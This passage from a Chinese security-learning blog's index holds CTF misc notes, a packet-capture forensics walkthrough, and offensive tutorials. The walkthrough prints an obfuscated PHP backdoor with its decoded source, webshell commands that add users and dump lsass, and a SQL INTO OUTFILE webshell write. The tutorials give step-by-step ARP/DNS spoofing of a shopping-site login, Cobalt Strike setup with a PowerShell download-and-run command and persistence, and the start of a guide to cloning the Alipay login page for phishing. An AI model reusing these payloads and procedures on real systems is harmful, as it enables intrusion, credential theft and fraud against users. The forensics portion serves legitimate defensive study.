1,2,3,4,0x3c3f706870206576616c28245f504f53545b27313233275d293b3f3e in into outoutfilefile \u0026#39;C:/phpstudy_pro/WWW/test/123.php\u0026#39;# ","date":"2026-01-30T20:41:45+08:00","permalink":"https://www.retr0.xyz/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/","title":"1.30 漏洞挖掘"},{"content":"前置知识 常见编码 base32 a-z 数字\nbase62 a-zA-Z0-9\nbase64 a-zA-Z0-9+/\nbase91 a-zA-Z0-9标点!#$%\u0026amp;()*+,./:;\u0026lt;=\u0026gt;?@[]^_{|}~\u0026quot;`\nbase100 emoji🤔\nHEX 0-9 A-F\n二维码 二维码\n定位符\n纠错率\n题目（杂项） 下载链接：https://pan.baidu.com/s/1FTjx7tKAQvFlxbKCPaI1Ng?pwd=1uux\nezPNG 确定没有改过高，然后放进stegsolve里\nanalsye \u0026ndash;\u0026gt; data extract \u0026ndash;\u0026gt; rgb全选到0，并选择lsb first \u0026ndash;\u0026gt; preview \u0026ndash;\u0026gt; save text \u0026ndash;\u0026gt; 将Unicode编码复制后解码\nimg 575Z373A2W646A793853564W5A317X486633576X4726572632462V496360484478777157693Z5731563Z657X76482W3Y\nVWXYZA \u0026ndash;\u0026gt; ABCDEF\t凯撒密码偏移\n575E373F2B646F793853564B5F317C486633576C4726572632462A496360484478777157693E5731563E657C76482B3D\ndraw 发现是255 255 255的内容，判断为色点图\n使用脚本解决\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from PIL import Image height = 400 width = 400 reader = open(\u0026#34;./timu.txt\u0026#34;,\u0026#34;r\u0026#34;) lines = reader.readlines() reader.close() img = Image.new(\u0026#34;RGB\u0026#34;,(400,400)) cnt = 0 for l in lines: l = l.strip() obj = l.split(\u0026#34; \u0026#34;) r = int(obj[0]) g = int(obj[1]) b = int(obj[2]) tow = (r,g,b) img.putpixel((cnt%400,cnt//400),tow) cnt+=1 img.save(\u0026#34;haha.png\u0026#34;) disco 查看波形，注意到 前0.0025秒有可疑的波形，向上我们按为0向下为1进行转换，将转换来的二进制串直接转换发现不行，那么以7为为一组，前面补0重新转换得到flag\n这有点刺耳 频谱\nhellokittykitty 波形\nsee 频谱\nhelloflag 使用下面的脚本推算图片原本的宽高：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import struct import binascii import zlib m = open(\u0026#34;./image1_preview.png\u0026#34;,\u0026#34;rb\u0026#34;).read() crc32key = int(m[29:33].hex(),16) data = bytearray(m[12:29]) for w in range(4095): width = struct.pack(\u0026#39;\u0026gt;i\u0026#39;,w) for h in range(4095): height = struct.pack(\u0026#39;\u0026gt;i\u0026#39;,h) for x in range(4): data[x + 4] = width[x] data[x + 8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) 修改后看到下方露出了字符串，当作凯撒密码判断。\nstegano 用PDF查看器（浏览器可能不行）打开，Ctrl+A，粘贴到记事本里，看到末尾有AB组成的大段字符：\n1 BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB 尝试用莫斯码翻译即可\nZIPZIP 需要爆破，不看\nFindTheTruth 可以看到该gif图其中的一帧有二维码，使用工具进行帧分离即可，如Photoshop、ffmpege、stegsolve等\nblackwhite 可以看到是一堆黑白色块，将其按黑把转为二进制，使用下面的脚本（直接放在target文件夹下命令行执行即可）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 flag_bin1 = \u0026#34;\u0026#34; flag_bin2 = \u0026#34;\u0026#34; white = open(\u0026#39;0.png\u0026#39;,\u0026#39;rb\u0026#39;).read() black = open(\u0026#39;1.png\u0026#39;,\u0026#39;rb\u0026#39;).read() for i in range(336): f = open(str(i)+\u0026#34;.png\u0026#34;,\u0026#39;rb\u0026#39;) if f.read() == white: flag_bin1 += \u0026#34;0\u0026#34; flag_bin2 += \u0026#34;1\u0026#34; else: flag_bin1 += \u0026#34;1\u0026#34; flag_bin2 += \u0026#34;0\u0026#34; flag1 = \u0026#34;\u0026#34; flag2 = \u0026#34;\u0026#34; for i in range(42): flag1 += chr(int(flag_bin1[8*i:8*(i+1)],2)) flag2 += chr(int(flag_bin2[8*i:8*(i+1)],2)) print(flag1) print(flag2) 流量分析：FlowAnalyze1 根据统计信息搜索telnet，追踪tcp流看到攻击者输入了用户名ctf和密码youcannevergetthis，接着下面返回了/etc/passwd中的内容。\n四个flag都能在包里面找到，但是不知道后面两个flag是何意味。\n流量分析：FlowAnalyze2 根据统计信息搜索http，看到攻击者使用联合查询进行了sql注入，在最下面的数据包中追踪http流看到返回的http源代码中有flag：\n1 Your Login name:2\u0026lt;br\u0026gt;Your Password:flag{th1s_ls_tHe_sQI1_anSwer} 流量分析 流量包下载链接：https://pan.baidu.com/s/1GO4bZ7dErQcpkocfguXXzQ?pwd=ynm5\n分析流量包请使用wireshark：WiresharkPortable64_latest.paf.exe\nwireshark的使用 过滤器的使用：Wireshark过滤器写法总结 - willingtolove - 博客园 Ctrl+F的使用：正常情况下选字符串、除非搜文件选十六进制值查文件头。 右键单个数据包使用追踪HTTP流可以查看更详细的数据流（如相关回包） 分析流程 统计-协议分级：确定重点分析的流量：\n常规流量：http\n重点关注流量（出现且占比较大）：\nhttps 找https解密密钥文件\ndns 成段数据 base64加密\ntelnet 明文\nicmp data\nftp 记录交互过程\nftp-data 记录传递的文件数据\n802.1x WiFi协议 爆破WiFi密码\n看看第一条的source是谁，谁就是黑客：\nhttp \u0026amp;\u0026amp; ip.addr == 黑客IP\n找比较特殊的流量数据：\n首先变化的流量 最后的流量 包含命令的流量 包含文件/数据的流量 目标（基础）：\n黑客ip是什么？ 从sql注入中获得了什么？ 最后进行了使用了什么攻击方式？ 逐包分析 1.pcap 题目（进阶）：\n黑客攻击的第一个受害主机的网卡IP地址 黑客对URL的哪一个 参数 实施了SQL注入 第一个受害主机网站数据库的表前缀 （加上下划线例如abc_） 第一个受害主机网站数据库的名字 Joomla后台管理员的密码 是多少 确认了黑客为：202.1.1.2\n受害者1为：192.168.1.8\n所以使用过滤：\n1 ip.src==202.1.1.2 \u0026amp;\u0026amp; ip.dst==192.168.1.8 \u0026amp;\u0026amp; http.request 发现黑客进行了sql注入操作（url解码后的内容）：\n1 option=(SELECT 5598 FROM(SELECT COUNT(*),CONCAT(0x71626a6b71,(SELECT (ELT(5598=5598,1))),0x716a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 再往下看到黑客通过修改User-Agent的方法使用序列化尝试执行语句：\n1 User-Agent: }__test|O:21:\u0026#34;JDatabaseDriverMysqli\u0026#34;:3:{s:2:\u0026#34;fc\u0026#34;;O:17:\u0026#34;JSimplepieFactory\u0026#34;:0:{}s:21:\u0026#34;\\0\\0\\0disconnectHandlers\u0026#34;;a:1:{i:0;a:2:{i:0;O:9:\u0026#34;SimplePie\u0026#34;:5:{s:8:\u0026#34;sanitize\u0026#34;;O:20:\u0026#34;JDatabaseDriverMysql\u0026#34;:0:{}s:8:\u0026#34;feed_url\u0026#34;;s:1101:\u0026#34;eval(chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(100).chr(105).chr(114).chr(110).chr(97).chr(109).chr(101).chr(40).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(91).chr(39).chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(70).chr(73).chr(76).chr(69).chr(78).chr(65).chr(77).chr(69).chr(39).chr(93).chr(41).chr(46).chr(39).chr(47).chr(107).chr(107).chr(107).chr(97).chr(97).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101).chr(40).chr(39).chr(100).chr(110).chr(90).chr(50).chr(80).chr(68).chr(57).chr(119).chr(97).chr(72).chr(65).chr(103).chr(90).chr(88).chr(90).chr(104).chr(98).chr(67).chr(103).chr(107).chr(88).chr(49).chr(66).chr(80).chr(85).chr(49).chr(82).chr(98).chr(101).chr(110).chr(112).chr(54).chr(88).chr(83).chr(107).chr(55).chr(80).chr(122).chr(52).chr(61).chr(39).chr(41).chr(41).chr(59));JFactory::getConfig();exit\u0026#34;;s:19:\u0026#34;cache_name_function\u0026#34;;s:6:\u0026#34;assert\u0026#34;;s:5:\u0026#34;cache\u0026#34;;b:1;s:11:\u0026#34;cache_class\u0026#34;;O:20:\u0026#34;JDatabaseDriverMysql\u0026#34;:0:{}}i:1;s:4:\u0026#34;init\u0026#34;;}}s:13:\u0026#34;\\0\\0\\0connection\u0026#34;;b:1;} 本地尝试执行chr()函数得到了语句的内容（base64已解码）：\n1 file_put_contents(dirname($_SERVER[\u0026#39;SCRIPT_FILENAME\u0026#39;]).\u0026#39;/kkkaaa.php\u0026#39;,base64_decode(\u0026#39;vvv\u0026lt;?php eval($_POST[zzz]);?\u0026gt;\u0026#39;)); 所以最终目的是先定位目录，再向目录中的kkkaaa.php文件写入webshell：\nvvv\u0026lt;?php eval($_POST[zzz]);?\u0026gt;，其中vvv是干扰内容\n2.pcap 题目（进阶）：\n黑客第一次获得的php木马的 密码 是什么 黑客第二次上传php木马是什么时间 第二次上传的木马通过HTTP协议中的 哪个头 传递数据 继续对黑客ip进行跟踪过滤（基于刚才的webshell是POST形式）：ip.src == 202.1.1.2 \u0026amp;\u0026amp; ip.dst == 192.168.1.8 \u0026amp;\u0026amp; http.request.method == POST\n看到黑客向webshell传入了命令（解码后）：\n1 @ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\u0026#34;-\u0026gt;|\u0026#34;);;$D=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);if($D==\u0026#34;\u0026#34;)$D=dirname($_SERVER[\u0026#34;PATH_TRANSLATED\u0026#34;]);$R=\u0026#34;{$D}\\t\u0026#34;;if(substr($D,0,1)!=\u0026#34;/\u0026#34;){foreach(range(\u0026#34;A\u0026#34;,\u0026#34;Z\u0026#34;) as $L)if(is_dir(\u0026#34;{$L}:\u0026#34;))$R.=\u0026#34;{$L}:\u0026#34;;}$R.=\u0026#34;\\t\u0026#34;;$u=(function_exists(\u0026#39;posix_getegid\u0026#39;))?@posix_getpwuid(@posix_geteuid()):\u0026#39;\u0026#39;;$usr=($u)?$u[\u0026#39;name\u0026#39;]:@get_current_user();$R.=php_uname();$R.=\u0026#34;({$usr})\u0026#34;;print $R;;echo(\u0026#34;|\u0026lt;-\u0026#34;);die(); 该命令并没有危害性，而是收集服务器系统信息，和目录查看\n但是再往下看其他数据包，同样是向webshell传入了POST（解码后，共4个参数）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026amp;zzz=@eval(base64_decode($_POST[z0])); // 这是webshell本身的参数名 \u0026amp;z0=@ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\u0026#34;-\u0026gt;|\u0026#34;);;$f=base64_decode($_POST[\u0026#34;z1\u0026#34;]);$c=$_POST[\u0026#34;z2\u0026#34;];$c=str_replace(\u0026#34;\\r\u0026#34;,\u0026#34;\u0026#34;,$c);$c=str_replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;,$c);$buf=\u0026#34;\u0026#34;;for($i=0;$i\u0026lt;strlen($c);$i+=2)$buf.=urldecode(\u0026#34;%\u0026#34;.substr($c,$i,2));echo(@fwrite(fopen($f,\u0026#34;w\u0026#34;),$buf)?\u0026#34;1\u0026#34;:\u0026#34;0\u0026#34;);;echo(\u0026#34;|\u0026lt;-\u0026#34;);die(); \u0026amp;z1=/var/www/html/joomla/tmp/footer.php \u0026amp;z2=\u0026lt;?php $p=\u0026#39;l\u0026gt;]ower\u0026#34;;$i\u0026gt;]=$m[1][0].$m[1]\u0026gt;][1];$h\u0026gt;]=$\u0026gt;]sl($ss(m\u0026gt;]d5($i.\u0026gt;]$kh),0\u0026gt;],3))\u0026gt;];$f=$s\u0026gt;]l($s\u0026gt;]s(md5\u0026#39;; $d=\u0026#39;]q=array_v\u0026gt;]\u0026gt;]alues(\u0026gt;]$q);\u0026gt;]preg_match_a\u0026gt;]ll(\u0026#34;/(\u0026gt;][\\\\w]\u0026gt;])[\\\\w-\u0026gt;]]+\u0026gt;](?:;q=\u0026gt;]0.([\\\\d]))?,?/\u0026#34;,\u0026gt;\u0026#39;; $W=\u0026#39;),$ss(\u0026gt;]$s[\u0026gt;]$i],\u0026gt;]0,$e))),$\u0026gt;]\u0026gt;]k)));\u0026gt;]$o=ob_get_content\u0026gt;]\u0026gt;]s();ob_end_\u0026gt;]\u0026gt;]clean();$d=\u0026gt;]base\u0026#39;; $e=\u0026#39;]T_LANGUAGE\u0026#34;];if($rr\u0026gt;]\u0026amp;\u0026amp;$\u0026gt;]ra){$\u0026gt;]u=pars\u0026gt;]e_\u0026gt;]url($rr);par\u0026gt;]se_st\u0026gt;]r($u[\u0026#34;\u0026gt;]query\u0026#34;],$\u0026gt;]q);$\u0026gt;\u0026#39;; $E=\u0026#39;\u0026gt;]64_e\u0026gt;]ncod\u0026gt;]e\u0026gt;](\u0026gt;]x(gz\u0026gt;]compress($o),$k));pri\u0026gt;]nt(\u0026#34;\u0026lt;$k\u0026gt;$d\u0026lt;\u0026gt;]/$k\u0026gt;\u0026#34;\u0026gt;])\u0026gt;];@\u0026gt;]session_destr\u0026gt;]oy();}}}}\u0026#39;; $t=\u0026#39;($i.\u0026gt;]$kf),0,3\u0026gt;]));$p\u0026gt;]=\u0026#34;\u0026#34;;fo\u0026gt;]r($z=1\u0026gt;];$z\u0026lt;\u0026gt;]count($m\u0026gt;][1]);$z+\u0026gt;]\u0026gt;]+)$p\u0026gt;].=$q[$m[\u0026gt;]2][$z]];i\u0026gt;\u0026#39;; $M=\u0026#39;]$ra,$\u0026gt;]m);if($q\u0026gt;]\u0026amp;\u0026amp;$m\u0026gt;]){@sessi\u0026gt;]on_sta\u0026gt;]\u0026gt;]rt();$s=\u0026amp;$\u0026gt;]_SESS\u0026gt;]ION;$\u0026gt;]\u0026gt;]s\u0026gt;]s=\u0026#34;substr\u0026#34;;$sl=\u0026#34;s\u0026gt;]\u0026gt;]trto\u0026#39;; $P=\u0026#39;]f(s\u0026gt;]tr\u0026gt;]pos($p\u0026gt;],$h)===0){$s[\u0026gt;]$i]=\u0026#34;\u0026#34;;$p\u0026gt;]=$ss($\u0026gt;]p,3);\u0026gt;]}if(ar\u0026gt;]ray\u0026gt;]_key_exist\u0026gt;]\u0026gt;]s($i,$\u0026gt;]s)\u0026gt;]){$\u0026gt;\u0026#39;; $j=str_replace(\u0026#39;fr\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;cfrrfreatfrfre_funcfrtfrion\u0026#39;); $k=\u0026#39;];}}re\u0026gt;]\u0026gt;]turn $o;\u0026gt;]}$\u0026gt;]r=$_SERV\u0026gt;]ER;$rr=@$r[\u0026gt;]\u0026#34;HTTP\u0026gt;]_REFERE\u0026gt;]R\u0026#34;];$ra\u0026gt;]=@\u0026gt;]$r[\u0026#34;\u0026gt;]HTTP_A\u0026gt;]CC\u0026gt;]EP\u0026gt;\u0026#39;; $g=\u0026#39;\u0026#34;\u0026#34;;for(\u0026gt;]$i=\u0026gt;]0;$i\u0026lt;$l;\u0026gt;])\u0026gt;]{for($j=0;($j\u0026lt;\u0026gt;]$c\u0026amp;\u0026amp;\u0026gt;]$i\u0026lt;$l);$\u0026gt;]j++,$i\u0026gt;]++){$o.\u0026gt;]=$t{$i\u0026gt;]}^$k{$j}\u0026gt;\u0026#39;; $R=\u0026#39;$k\u0026gt;]h=\u0026#34;cb4\u0026gt;]2\u0026#34;;$kf=\u0026#34;e130\u0026#34;\u0026gt;];functio\u0026gt;]n\u0026gt;] x($t\u0026gt;],$k){$c=s\u0026gt;]trle\u0026gt;]\u0026gt;]n($k);$l=strle\u0026gt;]n\u0026gt;]($t)\u0026gt;];$o=\u0026#39;; $Q=\u0026#39;]s[$i].=$p;$e=strp\u0026gt;]\u0026gt;]os(\u0026gt;]$s[$i\u0026gt;]],$f);if($\u0026gt;]e){$k=$kh.$k\u0026gt;]f;\u0026gt;]ob_sta\u0026gt;]rt();@e\u0026gt;]val(@gzun\u0026gt;]co\u0026gt;\u0026#39;; $v=\u0026#39;]mpress(@x\u0026gt;](@b\u0026gt;]as\u0026gt;]\u0026gt;]e64_decode(pr\u0026gt;]\u0026gt;]e\u0026gt;]g_repla\u0026gt;]ce(array(\u0026#34;/_/\u0026#34;,\u0026#34;/-/\u0026#34;),arr\u0026gt;]ay(\u0026gt;]\u0026#34;/\u0026#34;,\u0026#34;+\u0026#34;\u0026gt;]\u0026#39;; $x=str_replace(\u0026#39;\u0026gt;]\u0026#39;,\u0026#39;\u0026#39;,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E); $N=$j(\u0026#39;\u0026#39;,$x);$N(); ?\u0026gt; 这段 POST 内容的目的是： 利用已有的 PHP WebShell（kkkaaa.php，参数名为 zzz）远程执行代码，在服务器上写入一个高度混淆、通过 HTTP 头部通信并具备持久控制能力的 PHP 后门文件（/var/www/html/joomla/tmp/footer.php），以升级并隐蔽化攻击者的长期控制权限。\n在末尾加上这两行：\n1 2 var_dump($j); var_dump($x); 解混淆：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;?php $kh=\u0026#34;cb42\u0026#34;; $kf=\u0026#34;e130\u0026#34;; function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=\u0026#34;\u0026#34;; for($i=0;$i\u0026lt;$l;){ for($j=0;($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$l);$j++,$i++){ $o.=$t{$i}^$k{$j}; } } return $o; } $r=$_SERVER; $rr=@$r[\u0026#34;HTTP_REFERER\u0026#34;]; $ra=@$r[\u0026#34;HTTP_ACCEPT_LANGUAGE\u0026#34;]; if($rr\u0026amp;\u0026amp;$ra){ $u=parse_url($rr); parse_str($u[\u0026#34;query\u0026#34;],$q); $q=array_values($q); preg_match_all(\u0026#34;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\u0026#34;,$ra,$m); if($q\u0026amp;\u0026amp;$m){ @session_start(); $s=\u0026amp;$_SESSION; $ss=\u0026#34;substr\u0026#34;; $sl=\u0026#34;strtolower\u0026#34;; $i=$m[1][0].$m[1][1]; $h=$sl($ss(md5($i.$kh),0,3)); $f=$sl($ss(md5($i.$kf),0,3)); $p=\u0026#34;\u0026#34;; for($z=1;$z\u0026lt;count($m[1]);$z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0){ $s[$i]=\u0026#34;\u0026#34;; $p=$ss($p,3); } if(array_key_exists($i,$s)){ $s[$i].=$p; $e=strpos($s[$i],$f); if($e){ $k=$kh.$kf; ob_start(); @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\u0026#34;/_/\u0026#34;,\u0026#34;/-/\u0026#34;),array(\u0026#34;/\u0026#34;,\u0026#34;+\u0026#34;),$ss($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(\u0026#34;\u0026lt;$k\u0026gt;$d\u0026lt;/$k\u0026gt;\u0026#34;); @session_destroy(); } } } } ?\u0026gt; 分析z2(也就是footer.php的木马内容)，接下来攻击者将通过向 footer.php 发送看似正常的 HTTP 请求，在 Referer 与 Accept-Language 头中隐藏加密指令，从而远程触发后门执行并获取加密回显。\n追踪流，看看后面攻击者如何调用这个webshell，发现Accept-Language 都挺正常，说明马用Referer传递数据。\n3.pcap 题目（进阶）：\n内网主机的mysql用户名 和请求连接的密码hash 是多少(用户:密码hash) php代理第一次被使用时最先连接了哪个IP地址 在查看协议分级时发现存在mysql协议，于是过滤mysql协议流量：\ntcp contains \u0026quot;mysql\u0026quot; \u0026amp;\u0026amp; mysql\n发现攻击者对目标数据库进行大量的爆破，\n在倒数几条流量发现了登陆成功的痕迹，以及数据库账号和密码的md5值：\n1 admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4 重新过滤：\nip.addr == 202.1.1.2 and http.request.method == POST\n发现下面攻击者已经开始利用192.168.1.8上面的/tmp/tunnel.php代理了，虽然不知道代理搭建的具体时间，但推测是用第二个马（footer.php）搭的。\n此外，接下来攻击者还使用了一个位于/install/sh.php的webshell，推测也是用第二个马做的，时间未知，但是推测内容为\u0026lt;?php eval($_POST[123]);?\u0026gt;\n4.pcap 题目（进阶）：\n黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候 黑客在内网主机中添加的用户名和密码是多少 黑客从内网服务器中下载下来的文件名 过滤：(ip.addr == 202.1.1.2 || ip.addr == 192.168.1.8) \u0026amp;\u0026amp; http\n发现使用/install/index.php进行ls的命令执行，但没有回显，猜测是否目标主机为windows而非linux\n对于Windows获取目录下的文件列表用dir而非ls命令，修改过滤：\n(ip.addr == 202.1.1.2 || ip.addr == 192.168.1.8) \u0026amp;\u0026amp; http contains \u0026quot;dir\u0026quot;（这里因为用ls追踪流失败了所以直接提供dir的过滤语句，感兴趣可以试试ls的，虽然反正也会失败）\n得到相关回显，判断为windows主机\n修改过滤：是否存在有关管理员Administrator的相关操作\n1 (ip.addr == 202.1.1.2 || ip.addr == 192.168.1.8) \u0026amp;\u0026amp; http contains \u0026#34;Administrator\u0026#34; 在192.168.2.20发向192.168.1.8的POST流量中，发现存在star和kaka两个额外用户的创建\n修改过滤：ip.src == 192.168.2.20 \u0026amp;\u0026amp; http\n在时间为UTC 10:49:49的包中调用了sh.php这个webshell，内容为：\n1 2 3 4 5 6 7 8 9 123=@eval.(base64_decode($_POST[action])); \u0026amp;action=@ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\u0026#34;-+|\u0026#34;);;$p=base64_decode($_POST[\u0026#34;z1\u0026#34;]);$s=base64_decode($_POST[\u0026#34;z2\u0026#34;]);$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$c=substr($d,0,1)==\u0026#34;/\u0026#34;?\u0026#34;-c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;:\u0026#34;/c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;;$r=\u0026#34;{$p} {$c}\u0026#34;;@system($r.\u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;,$ret);print ($ret!=0)?\u0026#34; ret={$ret} \u0026#34;:\u0026#34;\u0026#34;;;echo(\u0026#34;|\u0026lt;-\u0026#34;);die(); \u0026amp;z1=cmd \u0026amp;z2=cd/d\u0026#34;C:\\phpStudy\\WWW\\b2evolution\\install\\test\\\u0026#34;\u0026amp;net user kaka kaka /add\u0026amp;echo [S]\u0026amp;cd\u0026amp;echo [E] 分析POST内容（特别是z2）可知攻击者在系统创建了用户名:密码为kaka:kaka的新用户。\n修改过滤：过滤POST流量\n1 ip.dst == 192.168.2.20 \u0026amp;\u0026amp; http.request.method==POST 挨个使用base64解码包中的参数值（累死我了😵），发现：\n1 cd/d\u0026#34;C:\\phpStudy\\WWW\\b2evolution\\install\\test\\\u0026#34;\u0026amp;procdump.exe -accepteula -ma lspasss.dmp\u0026amp;echo [S]\u0026amp;cd\u0026amp;echo [E] 可见攻击者使用了procdump.exe生成内存转储文件\n在最后一个包中解码参数值发现：\n1 C:\\phpStudy\\WWW\\b2evolution\\install\\test\\lsass.exe_180208_185247.dmp 可见这就是生成的文件（lsass.exe的内存转储文件含系统用户的明文密码等重要安全信息）。\n参考文献 Reference [1] Pur3. 2018.5.5铁三数据赛（第三赛区） 复现 [EB/OL]. (2020-02-16)[2026-01-29]. https://www.cnblogs.com/wrnan/p/12331564.html.\n","date":"2026-01-29T19:18:27+08:00","permalink":"https://www.retr0.xyz/p/1.29-misc%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"1.29 misc和流量分析"},{"content":"arp欺骗+dns欺骗 以下操作在kali2018中操作\n攻击端操作 1 2 service apache2 start echo 1 \u0026gt;\u0026gt; /proc/sys/net/ipv4/ip_forward 编辑 /etc/ettercap/etter.conf\n把开头的两个设置为0，即：\n1 2 3 [privs] ec_uid = 0 # nobody is the default ec_gid = 0 # nobody is the default 再把下面Linux部分的第二个，开头的注释删掉：\n1 2 redir_command_on = \u0026#34;iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport\u0026#34; redir_command_off = \u0026#34;iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport\u0026#34; 修改etter.dns，添加要劫持的网站的A记录到你的IP，例如：\n1 login.taobao.com A [黑客ip] ettercap -G 运行ettercap可视化窗口\nsniff\u0026ndash;unisniff\u0026ndash;ok\nhost\u0026mdash;host list\u0026mdash;scan for hosts\n网关\u0026ndash;target1，目标\u0026ndash;target2\nmitm-arp posi\u0026hellip;，选择第一个\u0026mdash;ok\nplugins\u0026mdash;dns-spoofing双击\nstart\u0026ndash;start sniff\n如何识破？ arp -a\n如果发现网关的地址和其中一个人的地址一样，说明被arp欺骗了\nWindows bug利用 畸形文件夹 文件夹分身 创建文件夹md xxx..\\\n向其中添加文件后会分身出名为xxx的文件夹，且原文件夹无法删除\n移除文件夹rd xxx..\\\n多重文件夹 创建文件夹md \u0026quot;\\haha\\ \\\u0026quot;\n向其中添加文件后发现里层的空文件夹也出现了该文件且无法删除\n移除文件夹rd /s /q \u0026quot;c:\\haha\u0026quot;\n镜像文件夹（可能修复） 创建文件夹md c:\\...\\\n打开文件夹里面是整个C盘的镜像，普通删除可能会损毁C盘\n移除文件夹md c:\\...\\\n文件隐藏 创建文件夹md a...\\\n复制文件到当中copy kfc.jpg c:\\a...\\kfc.jpg\n只能通过伪协议访问：\nfile:///C:/a.../\n修改文件夹为系统标识 1 2 3 4 5 6 7 8 9 重命名文件夹为以下： 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D} 回收站.{645ff040-5081-101b-9f08-00aa002f954e} 拔号⽹络.{992CFFA0-F557-101A-88EC-00DD010CCC48} 打印机.{2227a280-3aea-1069-a2de-08002b30309d} 控制⾯板.{21ec2020-3aea-1069-a2dd-08002b30309d} ⽹上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D} 改回来： rename 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D} haha Cobaltstrike的使用 cs属于c2软件\n可以支持windows和linux，支持多人协作\n使用Windows作为teamserver 先执行CMD添加密码\n1 teamserver.bat Teamserver的IP 123456 启动teamserver\n打开cobaltstrike.bat可以在windows上启动，ip填写Teamserver的IP，用户名随意密码123456\n设置监听器Listener\nadd，reverse_http，主机写的是teamserver的ip，端口6666\n配置payload\n攻击，钓鱼攻击，脚本web传递可以生成木马传递命令，以供目标执行，如：\n1 powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://192.168.142.132:80/a\u0026#39;))\u0026#34; 目标运行脚本之后，黑客木马上线\n选择目标，右键，进入beacon，先执行sleep 1等60s\n（因为cs默认心跳包为60s）\n之后就可以控制目标电脑\n如果要删除目标，右键，先exit，再remove\n也可以使用攻击，生成后门，exe格式的木马\n使用Kali作为teamserver linux的cs 4.1\n开启端口是50050，不要写错\n将teamserver文件的属性改为“可当作程序执行”\n进入目录执行./teamserver [kali的ip] [密码]\n如果windows需要连接kali的cs cobaltstrike.bat，输入ip是kali的ip\n如果linux连接cs ./cobaltstrike\n利用smb beacon木马保留后门\n监听器增加beacon smb，原有木马的基础之上，派生会话，选择smb的监听器\n进入smb连接的木马\nunlink 192.168.143.133 断开目标smb连接\n进入原来的木马连接\nlink 192.168.143.133 恢复目标smb连接\ncs+msf协同工作 外部监听器，打开msf\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_http\nset lhost [kali的ip]\nset lport 11111\nexploit -j\ncs的控制端\n增加一个监听器payload为foreign_http\nip选择kali的，端口11111\n选择被控制的目标，右键，派生会话，选择外部的监听器\n此时msf就上线\n对CS进行溯源反制 使用抓包看到黑客teamserver的ip地址，对黑客ip地址进行扫描\npython csbruter.py -t 100 -p 端口 黑客IP pass.txt\n有可能可以猜到黑客的teamserver的密码，然后自己使用cs去连接黑客的teamserver\n邮件伪造 这部分在之前的文章中已有说明swaks伪造邮件\n钓鱼网站（模板） 这部分在之前的文章中也有一个例子1.11 Linux提权(续)和钓鱼网站\n这里做一个补充，再提供一个修改真实网页的例子\n拓展补充：CSS选择器\nID 选择器（ID Selector）：通过元素的唯一标识符（ID）选择 HTML 元素。\nID 选择器以 # 开头，后面跟着 ID 名称。\n伪实战：以支付宝登录界面为例 打开到支付宝的登陆界面，右键选择“另存为”将网页保存到本地（文件名建议直接叫index），如果感觉原本的网站对引导用户输入用户名密码不够友好也可以先使用F12修改一些页面上的元素再保存（例如删去验证码登录和扫码登录）。\n使用VS 